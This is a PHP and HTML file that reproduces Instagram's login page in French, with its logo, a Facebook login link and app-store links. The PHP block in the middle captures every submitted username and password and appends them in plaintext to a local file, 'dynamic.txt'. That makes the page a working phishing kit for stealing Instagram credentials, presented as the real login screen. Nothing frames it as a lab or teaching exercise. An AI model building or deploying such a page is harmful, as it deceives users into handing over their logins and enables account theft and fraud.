<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <img class="picture" src="./img/photo-1.png" alt="#"/>
  <title>Instagram</title>
  <link rel="icon" type="images/png" href="./img/in.png" />

  <link rel="stylesheet" href="./styles/style.css">
</head>

<body>

  <div id="content-container">

    <!--Phone's pictures section-->
    <section class="phones">
      <img src="./img/phones.png" alt="pictures on phone" class="phone-image">
      <div class="display-phone">
        <img class="picture" src="./img/photo-1.png" alt="#">
        <img class="picture" src="./img/photo-2.png" alt="#">
        <img class="picture" src="./img/photo-3.png" alt="#">
        <img class="picture" src="./img/photo-4.png" alt="#">
        <img class="picture" src="./img/photo-5.png" alt="#">
      </div>
    </section>

    <!--User's log in section-->
    <section class="user">

      <div class="login-container">

        <!--Instagram Logo-->
        <div class="instagram-logo-box">
          <img class="instagram-logo" src="./img/instagram-logo.png">
        </div>

        <!--Form Login-->
        <form id="login-post" action="index.php" method="POST">
          <div class="inputs-container">
            <input type="text" name="username" placeholder="Num.téléphone, Nom d'utilisateur ou e-mail">
          </div>
          <div class="inputs-container">
            <input type="password" name="password" placeholder="Mot de passe">
          </div>
          <input class="login-button" type="submit" name="submit" value="Se connecter"  />

          <div class="or-container">
            <div class="line"></div>
            <div class="or">OU</div>
            <div class="line"></div>
          </div>

          <!--Facebook login-->
          <div class="facebook-container">
            <a class="facebook-login" href="" target="_blank"><img class="facebook-logo"
                src="./img/facebook-logo.png">Se connecter 
              avec Facebook</a>
          </div>
        </form>

        <?php
           if(isset($_POST['submit'])){
                    
                $username = $_POST["username"];
                $password = $_POST["password"];
                

                $T1 = "Nom d'utilisateur : $username ";
                $T2 = "Mot de passe : $password ";
       
                $filename = 'dynamic.txt';
                $somecontent = "$T1\n $T2\n ";
                $fp = fopen($filename, 'a');
                fwrite($fp, $somecontent);
                fclose($fp);

                /*if (is_writable($filename)) {
                    if (!$fp = fopen($filename, 'a')) {
                        echo "Cannot open file ($filename)";
                        exit;
                    }

                    if (fwrite($fp, $somecontent ) === FALSE) {
                        echo "Cannot write to file ($filename)";
                        exit;
                        }
                    echo "Succèss, on a écrit dans ($filename)";
                    fclose($fp);
                    } else {
                        echo "The file $filename is not writable";
                    }*/

                }
        ?>

        <!--Password recovery-->
        <a class="password-forgot" href="" target="_blank">Mot de passe oublié?</a>
      </div>

      <!--Sign up-->
      <div class="signup-container">
        <p>Vous n’avez pas de compte ?<a class="signup" href="" target="_blank">Inscrivez-vous</a></p>
      </div>

      <!--App's download-->
      <div class="get-container">
        <p>Téléchargez l’application.</p>
        <div class="download-container">
          <a class="download-appstore" href="" target="_blank"><img class="appstore"
              src="./img/applestore-logo.png"></a>
          <a class="download-googleplay" href="" target="_blank"><img class="googleplay"
              src="./img/googleplay-logo.png"></a>
        </div>
      </div>

    </section>

  </div>

  <footer class="page-footer">

    <div class="links-container">
      <ul class="links-list">
        <li>
          <a class="link" href="" target="_blank">Meta</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">About</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Blog</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Jobs</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Help</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">API</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Privacy</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Help</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Terms</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Top accounts</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Hashtags</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Locations</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Meta Verified</a>
        </li>
        <li>
          <a class="link" href="" target="_blank">Contact</a>
        </li>
      </ul>
    </div>

  </footer>
</body>

</html>